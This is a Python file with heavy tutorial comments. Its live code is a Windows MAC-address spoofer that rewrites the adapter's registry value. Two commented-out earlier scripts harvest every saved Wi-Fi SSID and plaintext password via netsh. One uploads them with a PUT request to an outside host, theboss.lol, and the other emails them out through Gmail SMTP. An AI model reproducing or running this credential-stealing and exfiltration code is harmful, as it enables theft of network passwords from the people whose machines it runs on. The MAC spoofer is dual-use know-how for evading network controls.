# # import subprocess
# # import re
# # import requests

# # # Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
# # # The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
# # # To save the contents that gets sent to the standard output stream (the terminal) we have to specify that we want to capture the output, so we specify the second argument as capture_output = True. This information gets stored in the stdout attribute. The information is stored in bytes and we need to decode it to Unicode before we use it as a String in Python.
# # command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

# # # We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
# # profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

# # # We create an empty list outside of the loop where dictionaries with all the wifi ssid and passwords will be saved.
# # wifi_list = list()


# # # If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
# # if len(profile_names) != 0:
# #     for name in profile_names:
# #         # Every wifi connection will need its own dictionary which will be appended to the wifi_list
# #         wifi_profile = dict()
# #         # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
# #         profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
# #         # We use a regular expression to only look for the absent cases so we can ignore them.
# #         if re.search("Security key           : Absent", profile_info):
# #             continue
# #         else:
# #             # Assign the SSID of the wifi profile to the dictionary
# #             wifi_profile["ssid"] = name
# #             # These cases aren't absent and we should run them "key=clear" command part to get the password
# #             profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
# #             # Again run the regular expressions to capture the group after the : which is the password
# #             password = re.search("Key Content            : (.*)\r", profile_info_pass)
# #             # Check if we found a password in the regular expression. All wifi connections will not have passwords.
# #             if password == None:
# #                 wifi_profile["password"] = None
# #             else:
# #                 # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
# #                 wifi_profile["password"] = password[1]
# #             # We append the wifi information to the wifi_list
# #             wifi_list.append(wifi_profile)


# # # Write the contents of the wifi ssids and passwords to file
# # with open('wifi.txt', 'w+') as fh:
# #     for x in wifi_list:
# #         fh.write(f"SSID: {x['ssid']}\nPassword: {x['password']}\n")

# # # Open file with read-only in binary so you can send via API
# # with open('wifi.txt', 'rb') as fh:
# #     # Do put request with the data as the file
# #     r = requests.put("http://theboss.lol/", data=fh)
# #     # status code should be 200 if successful
# #     if r.status_code == 200:
# #         print('Success')


# import subprocess
# import re
# import smtplib
# from email.message import EmailMessage

# # Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
# # The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
# # To save the contents that gets sent to the standard output stream (the terminal) we have to specify that we want to capture the output, so we specify the second argument as capture_output = True. This information gets stored in the stdout attribute. The information is stored in bytes and we need to decode it to Unicode before we use it as a String in Python.
# command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

# # We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
# profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

# # We create an empty list outside of the loop where dictionaries with all the wifi username and passwords will be saved.
# wifi_list = list()


# # If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
# if len(profile_names) != 0:
#     for name in profile_names:
#         # Every wifi connection will need its own dictionary which will be appended to the wifi_list
#         wifi_profile = dict()
#         # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
#         profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
#         # We use a regular expression to only look for the absent cases so we can ignore them.
#         if re.search("Security key           : Absent", profile_info):
#             continue
#         else:
#             # Assign the ssid of the wifi profile to the dictionary
#             wifi_profile["ssid"] = name
#             # These cases aren't absent and we should run them "key=clear" command part to get the password
#             profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
#             # Again run the regular expressions to capture the group after the : which is the password
#             password = re.search("Key Content            : (.*)\r", profile_info_pass)
#             # Check if we found a password in the regular expression. All wifi connections will not have passwords.
#             if password == None:
#                 wifi_profile["password"] = None
#             else:
#                 # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
#                 wifi_profile["password"] = password[1]
#             # We append the wifi information to the wifi_list
#             wifi_list.append(wifi_profile)

# # Create the message for the email
# email_message = ""
# for item in wifi_list:
#     email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

# # Create EmailMessage Object
# email = EmailMessage()
# # Who is the email from
# email["from"] = "name_of_sender"
# # To which email you want to send the email
# email["to"] = "email_address"
# # Subject of the email
# email["subject"] = "WiFi SSIDs and Passwords"
# email.set_content(email_message)

# # Create smtp server
# with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
#     smtp.ehlo()
#     # Connect securely to server
#     smtp.starttls()
#     # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
#     smtp.login("login_name", "password")
#     # Send email.
#     smtp.send_message(email)


import subprocess
import winreg
import re
import codecs

print("##############################################################")
print("1) Make sure you run this script with administrator privileges")
print("2) Make sure that the WiFi adapter is connected to a network")
print("##############################################################\n")

# MAC Addresses to attempt using. You will select one when the script is used.
# You can change the names in this list or add names to this list.
# Make sure you use 12 valid hexadecimal values. 
# If the MAC address change fails try setting the second character to 2 or 6 or A or E,
# for example: 0A1122334455 or 0A5544332211
# If unsure, leave the MAC addresses listed here as is.
mac_to_change_to = ["0A1122334455", "0E1122334455", "021122334455", "061122334455"]

# We create an empty list where we'll store all the MAC addresses.
mac_addresses = list()

# We start off by creating a regular expression (regex) for MAC addresses.
macAddRegex = re.compile(r"([A-Za-z0-9]{2}[:-]){5}([A-Za-z0-9]{2})")

# We create a regex for the transport names. It will work in this case. 
#  But when you use the .+ or .*, you should consider making it not as greedy.
transportName = re.compile("({.+})")

# We create regex to pick out the adapter index
adapterIndex = re.compile("([0-9]+)")

# Python allows us to run system commands by using a function provided by the subprocess module: 
# (subprocess.run(<list of command line arguments goes here>, 
# <specify the second argument if you want to capture the output>))
# The script is a parent process and creates a child process which runs the system command, 
# and will only continue once the child process has completed.
# To save the content that gets sent to the standard output stream (the terminal), 
# we have to specify that we want to capture the output, so we specify the second 
# argument as capture_output = True. This information gets stored in the stdout attribute. 
# The information is stored in bytes and we need to decode it to Unicode before we use it
# as a String in Python.
# We use Python to run the getmac command, and then capture the output. 
# We split the output at the newline so that we can work with the individual lines 
# (which will contain the Mac and transport name).
getmac_output = subprocess.run("getmac", capture_output=True).stdout.decode().split('\n')

# We loop through the output
for macAdd in getmac_output:
    # We use the regex to find the Mac Addresses.
    macFind = macAddRegex.search(macAdd)
    # We use the regex to find the transport name.
    transportFind = transportName.search(macAdd)
    # If you don't find a Mac Address or Transport name the option won't be listed.
    if macFind == None or transportFind == None:
        continue
    # We append a tuple with the Mac Address and the Transport name to a list.
    mac_addresses.append((macFind.group(0),transportFind.group(0)))

# Create a simple menu to select which Mac Address the user want to update.
print("Which MAC Address do you want to update?")
for index, item in enumerate(mac_addresses):
    print(f"{index} - Mac Address: {item[0]} - Transport Name: {item[1]}")

# Prompt the user to select Mac Address they want to update.
option = input("Select the menu item number corresponding to the MAC that you want to change:")

# Create a simple menu so the user can pick a MAC address to use
while True:
    print("Which MAC address do you want to use? This will change the Network Card's MAC address.")
    for index, item in enumerate(mac_to_change_to):
        print(f"{index} - Mac Address: {item}")

    # Prompt the user to select the MAC address they want to change to.
    update_option = input("Select the menu item number corresponding to the new MAC address that you want to use:")
    # Check to see if the option the user picked is a valid option.
    if int(update_option) >= 0 and int(update_option) < len(mac_to_change_to):
        print(f"Your Mac Address will be changed to: {mac_to_change_to[int(update_option)]}")
        break
    else:
        print("You didn't select a valid option. Please try again!")

# We know the first part of the key, we'll append the folders where we'll search the values
controller_key_part = r"SYSTEM\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}"

# We connect to the HKEY_LOCAL_MACHINE registry. If we specify None, 
# it means we connect to local machine's registry.
with winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) as hkey:
    # Create a list for the 21 folders. I used a list comprehension. The expression part of the list comprehension
    # makes use of a ternary operator. The transport value for you Mac Address should fall within this range. 
    # You could write multiple lines.
    controller_key_folders = [("\\000" + str(item) if item < 10 else "\\00" + str(item)) for item in range(0, 21)]
    # We now iterate through the list of folders we created.
    for key_folder in controller_key_folders:
        # We try to open the key. If we can't we just except and pass. But it shouldn't be a problem.
        try:
            # We have to specify the registry we connected to, the controller key 
            # (This is made up of the controller_key_part we know and the folder(key) name we created
            # with the list comprehension).
            with winreg.OpenKey(hkey, controller_key_part + key_folder, 0, winreg.KEY_ALL_ACCESS) as regkey:
                # We will now look at the Values under each key and see if we can find the "NetCfgInstanceId" 
                # with the same Transport Id as the one we selected.
                try:
                    # Values start at 0 in the registry and we have to count through them. 
                    # This will continue until we get a WindowsError (Where we will then just pass) 
                    # then we'll start with the next folder until we find the correct key which contains 
                    # the value we're looking for.
                    count = 0
                    while True:
                        # We unpack each individual winreg value into name, value and type.
                        name, value, type = winreg.EnumValue(regkey, count)
                        # To go to the next value if we didn't find what we're looking for we increment count.
                        count = count + 1
                        # We check to see if our "NetCfgInstanceId" is equal to our Transport number for our 
                        # selected Mac Address.
                        if name == "NetCfgInstanceId" and value == mac_addresses[int(option)][1]:
                            new_mac_address = mac_to_change_to[int(update_option)]
                            winreg.SetValueEx(regkey, "NetworkAddress", 0, winreg.REG_SZ, new_mac_address)
                            print("Successly matched Transport Number")
                            # get list of adapters and find index of adapter you want to disable.
                            break
                except WindowsError:
                    pass
        except:
            pass


# Code to disable and enable Wireless devicess
run_disable_enable = input("Do you want to disable and reenable your wireless device(s). Press Y or y to continue:")
# Changes the input to lowercase and compares to y. If not y the while function which contains the last part will never run.
if run_disable_enable.lower() == 'y':
    run_last_part = True
else:
    run_last_part = False

# run_last_part will be set to True or False based on above code.
while run_last_part:

    # Code to disable and enable the network adapters
    # We get a list of all network adapters. You have to ignore errors, as it doesn't like the format the command returns the data in.
    network_adapters = subprocess.run(["wmic", "nic", "get", "name,index"], capture_output=True).stdout.decode('utf-8', errors="ignore").split('\r\r\n')
    for adapter in network_adapters:
        # We get the index for each adapter
        adapter_index_find = adapterIndex.search(adapter.lstrip())
        # If there is an index and the adapter has wireless in description we are going to disable and enable the adapter
        if adapter_index_find and "Wireless" in adapter:
            disable = subprocess.run(["wmic", "path", "win32_networkadapter", "where", f"index={adapter_index_find.group(0)}", "call", "disable"],capture_output=True)
            # If the return code is 0, it means that we successfully disabled the adapter
            if(disable.returncode == 0):
                print(f"Disabled {adapter.lstrip()}")
            # We now enable the network adapter again.
            enable = subprocess.run(["wmic", "path", f"win32_networkadapter", "where", f"index={adapter_index_find.group(0)}", "call", "enable"],capture_output=True)
            # If the return code is 0, it means that we successfully enabled the adapter
            if (enable.returncode == 0):
                print(f"Enabled {adapter.lstrip()}")

    # We run the getmac command again
    getmac_output = subprocess.run("getmac", capture_output=True).stdout.decode()
    # We recreate the Mac Address as ot shows up in getmac XX-XX-XX-XX-XX-XX format from the 12 character string we have. We split the string into strings of length 2 using list comprehensions and then. We use "-".join(list) to recreate the address
    mac_add = "-".join([(mac_to_change_to[int(update_option)][i:i+2]) for i in range(0, len(mac_to_change_to[int(update_option)]), 2)])
    # We want to check if Mac Address we changed to is in getmac output, if so we have been successful.
    if mac_add in getmac_output:
        print("Mac Address Success")
    # Break out of the While loop. Could also change run_last_part to False.
    break